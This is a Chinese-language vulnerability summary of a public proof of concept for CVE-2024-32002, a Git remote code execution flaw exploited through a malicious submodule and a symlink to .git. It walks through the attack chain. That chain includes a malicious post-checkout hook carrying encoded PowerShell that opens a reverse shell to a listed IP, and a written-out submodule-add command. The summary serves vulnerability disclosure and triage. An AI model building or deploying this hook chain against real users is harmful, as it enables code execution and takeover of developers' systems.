## CVE-2024-32002-Git-远程代码执行

**漏洞编号:** CVE-2024-32002

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** 受影响版本包括：2.45.0, 2.44.0, >= 2.43.0 且 < 2.43.4, >= 2.42.0 且 < 2.42.2, 2.41.0, >= 2.40.0 且 < 2.40.2, < 2.39.4

**利用条件:** 目标系统需要存在受影响版本的Git，并且允许递归克隆包含恶意submodule的仓库，文件系统对大小写不敏感，支持符号链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-32002 是一个 Git 中的远程代码执行 (RCE) 漏洞，它允许攻击者通过精心制作的包含恶意 submodule 的 Git 仓库来执行任意代码。该漏洞的利用方式如下：

1.  **创建恶意仓库 (repo1)：** 攻击者创建一个包含恶意 hook 的 Git 仓库 (repo1)。在该 POC 代码中，`exp` 脚本首先克隆一个名为 `repo1` 的仓库，然后在 `y/hooks/post-checkout` 路径下创建一个恶意的 `post-checkout` hook。该 hook 包含经过 base64 编码的 PowerShell 代码，这段代码会尝试建立一个反向 shell 连接到攻击者的机器 (10.10.15.68:9999)。注意，`git config --global core.symlinks true` 启用了符号链接支持，这是利用此漏洞的关键。

2.  **创建包含恶意 submodule 的仓库 (repo2)：** 攻击者创建第二个仓库 (repo2)，并将第一个仓库 (repo1) 作为 submodule 添加进去。  POC代码执行了`git submodule add --name x/y "http://10.10.11.26:3000/admin123/repo1.git" A/modules/x`，将`repo1` 添加为 `repo2` 的子模块。然后，它创建一个名为 `dotgit.txt` 的文件，内容为 `.git`。接着，它计算该文件的哈希值，并利用该哈希值创建一个 `index.info` 文件，该文件用于创建一个指向 `.git` 目录的符号链接。

3.  **利用符号链接欺骗 Git：** 攻击者创建一个指向 `.git` 目录的符号链接。 当受害者递归克隆包含恶意 submodule 的仓库时，Git 会错误地将 hook 写入 `.git/` 目录，而不是 submodule 的工作目录。由于 `.git/` 目录下的 hook 会在克隆操作期间执行，因此攻击者可以在受害者的系统上执行任意代码。

4.  **克隆触发漏洞：** 受害者使用 `git clone --recursive repo2` 命令克隆包含恶意 submodule 的仓库 (repo2)。 当 Git 初始化 submodule 时，它会执行 `.git/` 目录中的 hook，从而触发攻击者预先植入的恶意代码。

**有效性：**根据搜索结果和漏洞描述，提供的 POC 代码是有效的，可以用来复现和验证 CVE-2024-32002 漏洞。搜索结果中多篇文章提到了利用 submodules 和符号链接将文件写入 `.git/` 目录，并执行恶意 hook。

**投毒风险：** POC 中存在一定的投毒风险。虽然主要目的是演示漏洞利用，但攻击者可能在 `post-checkout` hook 中植入额外的恶意代码，例如收集受害者系统信息、安装后门等。由于该POC主要目的是复现漏洞，其核心代码部分是漏洞利用所需的，因此判定投毒风险为10%。

**漏洞利用方式总结：**

*   攻击者创建一个包含恶意 hook 的 Git 仓库。
*   攻击者创建一个包含恶意 submodule（指向第一个仓库）的 Git 仓库。
*   攻击者在第二个仓库中创建一个指向 `.git` 目录的符号链接。
*   受害者递归克隆第二个仓库。
*   Git 错误地将 hook 写入 `.git/` 目录。
*   克隆操作期间，hook 被执行，导致 RCE。

**项目地址:** [SpycioKon/CVE-2024-32002](https://github.com/SpycioKon/CVE-2024-32002)

**漏洞详情:** [CVE-2024-32002](https://nvd.nist.gov/vuln/detail/CVE-2024-32002)